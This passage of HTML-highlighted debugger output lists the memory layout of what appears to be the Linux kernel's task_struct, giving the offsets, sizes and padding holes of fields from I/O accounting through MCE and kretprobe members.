</span></span><span class="line"><span class="cl"><span class="cm">/* 3408      |     8 */</span>        <span class="n">u64</span> <span class="n">cancelled_write_bytes</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   56 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">ioac</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3416      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">psi_flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3424      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_rss_mem1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3432      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_vm_mem1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3440      |     8 */</span>    <span class="n">u64</span> <span class="n">acct_timexpd</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3448      |   128 */</span>    <span class="kt">nodemask_t</span> <span class="n">mems_allowed</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3576      |     4 */</span>    <span class="kt">seqcount_spinlock_t</span> <span class="n">mems_allowed_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3580      |     4 */</span>    <span class="kt">int</span> <span class="n">cpuset_mem_spread_rotor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3584      |     4 */</span>    <span class="kt">int</span> <span class="n">cpuset_slab_spread_rotor</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3592      |     8 */</span>    <span class="k">struct</span> <span class="n">css_set</span> <span class="o">*</span><span class="n">cgroups</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3600      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3600      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3608      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">cg_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3616      |     4 */</span>    <span class="n">u32</span> <span class="n">closid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3620      |     4 */</span>    <span class="n">u32</span> <span class="n">rmid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3624      |     8 */</span>    <span class="k">struct</span> <span class="n">robust_list_head</span> <span class="o">*</span><span class="n">robust_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3632      |     8 */</span>    <span class="k">struct</span> <span class="n">compat_robust_list_head</span> <span class="o">*</span><span class="n">compat_robust_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3640      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3640      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3648      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">pi_state_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3656      |     8 */</span>    <span class="k">struct</span> <span class="n">futex_pi_state</span> <span class="o">*</span><span class="n">pi_state_cache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3664      |    32 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3664      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3672      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3676      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3676      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3680      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3680      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3688      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">futex_exit_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3696      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">futex_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3704      |     8 */</span>    <span class="k">struct</span> <span class="n">perf_event_context</span> <span class="o">*</span><span class="n">perf_event_ctxp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3712      |    32 */</span>    <span class="k">struct</span> <span class="n">mutex</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3712      |     8 */</span>        <span class="kt">atomic_long_t</span> <span class="n">owner</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3720      |     4 */</span>        <span class="kt">raw_spinlock_t</span> <span class="n">wait_lock</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3724      |     4 */</span>        <span class="k">struct</span> <span class="n">optimistic_spin_queue</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3724      |     4 */</span>            <span class="kt">atomic_t</span> <span class="n">tail</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):    4 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">osq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3728      |    16 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3728      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3736      |     8 */</span>            <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">wait_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   32 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">perf_event_mutex</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3744      |    16 */</span>    <span class="k">struct</span> <span class="n">list_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3744      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3752      |     8 */</span>        <span class="k">struct</span> <span class="n">list_head</span> <span class="o">*</span><span class="n">prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">perf_event_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3760      |     8 */</span>    <span class="k">struct</span> <span class="n">mempolicy</span> <span class="o">*</span><span class="n">mempolicy</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3768      |     2 */</span>    <span class="kt">short</span> <span class="n">il_prev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3770      |     2 */</span>    <span class="kt">short</span> <span class="n">pref_node_fork</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3772      |     4 */</span>    <span class="kt">int</span> <span class="n">numa_scan_seq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3776      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">numa_scan_period</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3780      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">numa_scan_period_max</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3784      |     4 */</span>    <span class="kt">int</span> <span class="n">numa_preferred_nid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3792      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_migrate_retry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3800      |     8 */</span>    <span class="n">u64</span> <span class="n">node_stamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3808      |     8 */</span>    <span class="n">u64</span> <span class="n">last_task_numa_placement</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3816      |     8 */</span>    <span class="n">u64</span> <span class="n">last_sum_exec_runtime</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3824      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3824      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3832      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">numa_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3840      |     8 */</span>    <span class="k">struct</span> <span class="n">numa_group</span> <span class="o">*</span><span class="n">numa_group</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3848      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">numa_faults</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3856      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">total_numa_faults</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3864      |    24 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_faults_locality</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3888      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">numa_pages_migrated</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3896      |     8 */</span>    <span class="k">struct</span> <span class="n">rseq</span> <span class="o">*</span><span class="n">rseq</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3904      |     4 */</span>    <span class="n">u32</span> <span class="n">rseq_len</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3908      |     4 */</span>    <span class="n">u32</span> <span class="n">rseq_sig</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3912      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">rseq_event_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3920      |     4 */</span>    <span class="kt">int</span> <span class="n">mm_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3924      |     4 */</span>    <span class="kt">int</span> <span class="n">last_mm_cid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3928      |     4 */</span>    <span class="kt">int</span> <span class="n">migrate_from_cpu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3932      |     4 */</span>    <span class="kt">int</span> <span class="n">mm_cid_active</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3936      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3936      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3944      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">cid_work</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1032 */</span>    <span class="k">struct</span> <span class="n">tlbflush_unmap_batch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>        <span class="k">struct</span> <span class="n">arch_tlbflush_unmap_batch</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>            <span class="k">struct</span> <span class="n">cpumask</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 3952      |  1024 */</span>                <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">bits</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                       <span class="cm">/* total size (bytes): 1024 */</span>
</span></span><span class="line"><span class="cl">                                   <span class="p">}</span> <span class="n">cpumask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes): 1024 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">arch</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4976      |     1 */</span>        <span class="kt">bool</span> <span class="n">flush_required</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4977      |     1 */</span>        <span class="kt">bool</span> <span class="n">writable</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  6-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes): 1032 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">tlb_ubc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4984      |     8 */</span>    <span class="k">struct</span> <span class="n">pipe_inode_info</span> <span class="o">*</span><span class="n">splice_pipe</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4992      |    16 */</span>    <span class="k">struct</span> <span class="n">page_frag</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 4992      |     8 */</span>        <span class="k">struct</span> <span class="n">page</span> <span class="o">*</span><span class="n">page</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5000      |     4 */</span>        <span class="n">__u32</span> <span class="n">offset</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5004      |     4 */</span>        <span class="n">__u32</span> <span class="n">size</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">task_frag</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5008      |     8 */</span>    <span class="k">struct</span> <span class="n">task_delay_info</span> <span class="o">*</span><span class="n">delays</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5016      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_dirtied</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5020      |     4 */</span>    <span class="kt">int</span> <span class="n">nr_dirtied_pause</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5024      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">dirty_paused_when</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5032      |     8 */</span>    <span class="n">u64</span> <span class="n">timer_slack_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5040      |     8 */</span>    <span class="n">u64</span> <span class="n">default_timer_slack_ns</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5048      |     4 */</span>    <span class="kt">int</span> <span class="n">curr_ret_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5052      |     4 */</span>    <span class="kt">int</span> <span class="n">curr_ret_depth</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5056      |     8 */</span>    <span class="k">struct</span> <span class="n">ftrace_ret_stack</span> <span class="o">*</span><span class="n">ret_stack</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5064      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">ftrace_timestamp</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5072      |     4 */</span>    <span class="kt">atomic_t</span> <span class="n">trace_overrun</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5076      |     4 */</span>    <span class="kt">atomic_t</span> <span class="n">tracing_graph_pause</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5080      |     8 */</span>    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">trace_recursion</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5088      |     8 */</span>    <span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">memcg_in_oom</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5096      |     4 */</span>    <span class="kt">gfp_t</span> <span class="n">memcg_oom_gfp_mask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5100      |     4 */</span>    <span class="kt">int</span> <span class="n">memcg_oom_order</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5104      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">memcg_nr_pages_over_high</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5112      |     8 */</span>    <span class="k">struct</span> <span class="n">mem_cgroup</span> <span class="o">*</span><span class="n">active_memcg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5120      |     8 */</span>    <span class="k">struct</span> <span class="n">gendisk</span> <span class="o">*</span><span class="n">throttle_disk</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5128      |     8 */</span>    <span class="k">struct</span> <span class="n">uprobe_task</span> <span class="o">*</span><span class="n">utask</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5136      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sequential_io</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5140      |     4 */</span>    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">sequential_io_avg</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |     0 */</span>    <span class="k">struct</span> <span class="n">kmap_ctrl</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="o">&lt;</span><span class="n">no</span> <span class="n">data</span> <span class="n">fields</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    0 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">kmap_ctrl</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5144      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5152      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">rcu</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5160      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">rcu_users</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5164      |     4 */</span>    <span class="kt">int</span> <span class="n">pagefault_disabled</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5168      |     8 */</span>    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">oom_reaper_list</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |    40 */</span>    <span class="k">struct</span> <span class="n">timer_list</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |    16 */</span>        <span class="k">struct</span> <span class="n">hlist_node</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5176      |     8 */</span>            <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5184      |     8 */</span>            <span class="k">struct</span> <span class="n">hlist_node</span> <span class="o">**</span><span class="n">pprev</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                                   <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                               <span class="p">}</span> <span class="n">entry</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5192      |     8 */</span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">expires</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5200      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">function</span><span class="p">)(</span><span class="k">struct</span> <span class="n">timer_list</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5208      |     4 */</span>        <span class="n">u32</span> <span class="n">flags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte padding  */</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   40 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">oom_reaper_timer</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5216      |     8 */</span>    <span class="k">struct</span> <span class="n">vm_struct</span> <span class="o">*</span><span class="n">stack_vm_area</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5224      |     4 */</span>    <span class="kt">refcount_t</span> <span class="n">stack_refcount</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5228      |     4 */</span>    <span class="kt">int</span> <span class="n">patch_state</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5232      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">security</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5240      |     8 */</span>    <span class="k">struct</span> <span class="n">bpf_local_storage</span> <span class="o">*</span><span class="n">bpf_storage</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5248      |     8 */</span>    <span class="k">struct</span> <span class="n">bpf_run_ctx</span> <span class="o">*</span><span class="n">bpf_ctx</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5256      |     8 */</span>    <span class="kt">void</span> <span class="o">*</span><span class="n">mce_vaddr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5264      |     8 */</span>    <span class="n">__u64</span> <span class="n">mce_kflags</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5272      |     8 */</span>    <span class="n">u64</span> <span class="n">mce_addr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 0   |     8 */</span>    <span class="n">__u64</span> <span class="nl">mce_ripv</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 1   |     8 */</span>    <span class="n">__u64</span> <span class="nl">mce_whole_page</span> <span class="p">:</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5280: 2   |     8 */</span>    <span class="n">__u64</span> <span class="nl">__mce_reserved</span> <span class="p">:</span> <span class="mi">62</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5288      |    16 */</span>    <span class="k">struct</span> <span class="n">callback_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5288      |     8 */</span>        <span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5296      |     8 */</span>        <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="k">struct</span> <span class="n">callback_head</span> <span class="o">*</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):   16 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">mce_kill_me</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5304      |     4 */</span>    <span class="kt">int</span> <span class="n">mce_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* XXX  4-byte hole  */</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5312      |     8 */</span>    <span class="k">struct</span> <span class="n">llist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5312      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
</span></span><span class="line"><span class="cl">                           <span class="p">}</span> <span class="n">kretprobe_instances</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5320      |     8 */</span>    <span class="k">struct</span> <span class="n">llist_head</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 5320      |     8 */</span>        <span class="k">struct</span> <span class="n">llist_node</span> <span class="o">*</span><span class="n">first</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">                               <span class="cm">/* total size (bytes):    8 */</span>
